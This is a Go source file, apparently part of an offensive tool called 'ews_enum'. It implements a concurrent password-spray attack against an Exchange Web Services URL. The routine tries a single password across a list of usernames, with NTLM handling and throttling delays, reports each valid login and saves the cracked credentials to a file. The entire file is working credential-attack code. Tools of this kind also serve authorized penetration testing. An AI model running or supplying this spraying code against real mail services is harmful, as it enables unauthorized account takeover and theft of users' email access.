package main

import (
	"fmt"
	"io"
	"sync"
	"sync/atomic"
	"time"

	"ews_enum/internal/ews"
)

func runSpray(cfg appConfig, stdout, stderr io.Writer) int {
	users, err := readLines(cfg.UserFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot read userfile: %v\n", err)
		return 1
	}
	if len(users) == 0 {
		fmt.Fprintf(stderr, "[!] No usernames found in %s\n", cfg.UserFile)
		return 1
	}

	fmt.Fprintf(stderr, "[*] Password spray against %s\n", cfg.URL)
	fmt.Fprintf(stderr, "[*] Users: %d, workers: %d, connections: %d\n", len(users), cfg.Workers, cfg.Conns)

	var mu sync.Mutex
	var validUsers []string
	var attemptCount atomic.Int64
	totalUsers := int64(len(users))
	workCh := make(chan string, cfg.Workers*2)
	var wg sync.WaitGroup

	clearProgress := func() {
		fmt.Fprintf(stderr, "\r%-100s\r", "")
	}

	client := ews.NewClient(ews.ClientOpts{
		NTLM: cfg.NTLM, TimeoutSec: cfg.Timeout, MaxConns: cfg.Conns,
		DisableKeepAlive: cfg.NTLM, // NTLM binds auth to TCP connection; do not reuse across users.
	})

	worker := func() {
		defer wg.Done()
		for username := range workCh {
			if cfg.DelayMS > 0 {
				time.Sleep(time.Duration(cfg.DelayMS) * time.Millisecond)
			}

			count := attemptCount.Add(1)
			mu.Lock()
			hits := len(validUsers)
			mu.Unlock()
			fmt.Fprintf(stderr, "\r[*] [%d/%d] Trying: %-40s (valid: %d)", count, totalUsers, username, hits)

			result, authErr := ews.TestAuth(client, cfg.URL, username, cfg.Pass)
			switch result {
			case ews.AuthSuccess:
				mu.Lock()
				validUsers = append(validUsers, username)
				clearProgress()
				fmt.Fprintf(stderr, "[+] VALID: %s\n", username)
				mu.Unlock()
			case ews.AuthError:
				mu.Lock()
				clearProgress()
				fmt.Fprintf(stderr, "[!] ERROR: %s — %v\n", username, authErr)
				mu.Unlock()
			}
		}
	}

	wg.Add(cfg.Workers)
	for i := 0; i < cfg.Workers; i++ {
		go worker()
	}

	for _, user := range users {
		workCh <- user
	}
	close(workCh)
	wg.Wait()

	clearProgress()
	fmt.Fprintf(stderr, "[*] Spray complete: %d/%d valid credentials\n", len(validUsers), len(users))

	if len(validUsers) == 0 {
		return 0
	}

	out, closeOut, err := openOutput(stdout, cfg.OutFile)
	if err != nil {
		fmt.Fprintf(stderr, "[!] Cannot create output file: %v\n", err)
		return 1
	}
	defer closeOut()

	if err := writeSprayResults(out, cfg.Format, cfg.Pass, validUsers); err != nil {
		fmt.Fprintf(stderr, "[!] Writing output failed: %v\n", err)
		return 1
	}

	if cfg.OutFile != "" {
		fmt.Fprintf(stderr, "[*] Results written to %s\n", cfg.OutFile)
	}

	return 0
}
